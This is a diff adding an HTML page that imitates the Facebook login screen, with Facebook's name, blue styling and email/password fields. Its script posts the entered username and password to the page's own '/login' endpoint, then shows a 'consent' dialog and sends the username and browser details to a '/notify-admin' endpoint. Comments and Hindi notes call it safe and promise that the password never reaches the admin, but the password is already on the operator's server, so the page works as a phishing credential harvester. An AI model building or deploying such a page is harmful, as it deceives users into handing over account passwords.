@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="hi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Consent Login (Safe)</title>
+<style>
+  body{font-family:Arial;background:#f2f2f2;margin:0}
+  .card{max-width:360px;margin:80px auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
+  input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px}
+  button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer}
+  .note{font-size:13px;color:#444;margin-top:10px;text-align:center}
+  .modal-back{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center}
+  .modal{background:#fff;padding:18px;border-radius:8px;max-width:420px;width:92%}
+  .row{display:flex;gap:8px;justify-content:flex-end;margin-top:12px}
+  .btn-ghost{background:transparent;border:1px solid #ccc;padding:8px 12px;border-radius:6px;cursor:pointer}
+  .btn-primary{background:#1877f2;color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h2 style="text-align:center;color:#1877f2;margin:0 0 12px">facebook</h2>
+
+    <form id="loginForm" autocomplete="off">
+      <input id="username" name="username" type="text" placeholder="Email or phone number" required>
+      <input id="password" name="password" type="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="note">डेमो: पासवर्ड कभी भी admin को भेजा नहीं जाएगा।</div>
+  </div>
+
+  <!-- Consent modal -->
+  <div id="modalBack" class="modal-back" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document">
+      <h3>अनुमति दें</h3>
+      <p>क्या आप अनुमति देते हैं कि आपका <strong>ईमेल/फोन नंबर</strong> और लॉग-इवेंट हमारी टीम (admin) को भेजे जाएँ ताकि वे सहायता दे सकें?</p>
+      <p style="font-size:13px;color:#666">नोट: <strong>पासवर्ड कभी नहीं भेजा जाएगा</strong>. यदि आप सहमत हैं तो नीचे चेकबॉक्स चुनें और “Thanks दबाये” दबाएँ।</p>
+
+      <div style="margin-top:8px">
+        <label><input id="consentCheckbox" type="checkbox"> मैं अनुमति देता/देती हूँ</label>
+      </div>
+
+      <div class="row">
+        <button id="cancelConsent" class="btn-ghost" type="button">रद्द करें</button>
+        <button id="confirmConsent" class="btn-primary" type="button">Thanks दबाये</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // === CONFIG: अपने सर्वर URL से बदलें (HTTPS) ===
+  const LOGIN_ENDPOINT = '/login';            // सर्वर पर login request (POST)
+  const ADMIN_NOTIFY_ENDPOINT = '/notify-admin'; // सर्वर-साइड internal notify (server-to-server)
+  // =================================================
+
+  const form = document.getElementById('loginForm');
+  const modalBack = document.getElementById('modalBack');
+  const consentCheckbox = document.getElementById('consentCheckbox');
+  const confirmConsent = document.getElementById('confirmConsent');
+  const cancelConsent = document.getElementById('cancelConsent');
+
+  let tmpUsername = '';
+  let tmpPassword = '';
+
+  // Step 1: Submit credentials to your OWN server (securely via POST).
+  // Password is sent to YOUR server ONLY for authentication; client WILL NOT send password to admin endpoint.
+  form.addEventListener('submit', async function(e){
+    e.preventDefault();
+    tmpUsername = document.getElementById('username').value.trim();
+    tmpPassword = document.getElementById('password').value;
+
+    // Send credentials securely to your server for authentication.
+    // Server should be HTTPS and must NOT forward password to any third party.
+    try {
+      const res = await fetch(LOGIN_ENDPOINT, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ username: tmpUsername, password: tmpPassword })
+      });
+      const j = await res.json();
+
+      // Show consent modal only AFTER server responds (you can decide when to ask)
+      // For demo we always ask user for consent to notify admin.
+      consentCheckbox.checked = false;
+      modalBack.style.display = 'flex';
+      modalBack.setAttribute('aria-hidden','false');
+
+      // Optionally show server response somewhere or use j.success
+      console.log('Login response:', j);
+
+    } catch(err) {
+      alert('नेटवर्क त्रुटि — पुनः प्रयास करें।');
+      console.error(err);
+    }
+  });
+
+  cancelConsent.addEventListener('click', function(){
+    modalBack.style.display = 'none';
+    modalBack.setAttribute('aria-hidden','true');
+    // clear password for safety
+    document.getElementById('password').value = '';
+  });
+
+  confirmConsent.addEventListener('click', async function(){
+    if(!consentCheckbox.checked){
+      alert('कृपया अनुमति के लिए चेकबॉक्स चुनें।');
+      return;
+    }
+    modalBack.style.display = 'none';
+    modalBack.setAttribute('aria-hidden','true');
+
+    // Show brief thanks locally
+    alert('Thanks — अनुमति मिल गई।');
+
+    // Send ONLY username + metadata to server notify endpoint.
+    // IMPORTANT: never send password here.
+    try {
+      const payload = {
+        username: tmpUsername,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent || null
+      };
+      const r = await fetch(ADMIN_NOTIFY_ENDPOINT, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+      });
+      if (!r.ok) throw new Error('notify failed');
+      // clear password for safety
+      document.getElementById('password').value = '';
+      alert('लॉग-इवेंट admin को भेज दिया गया (डेमो)।');
+    } catch (err) {
+      console.error(err);
+      alert('सूचना भेजने में समस्या।');
+    }
+  });
+</script>
+</body>
+</html>
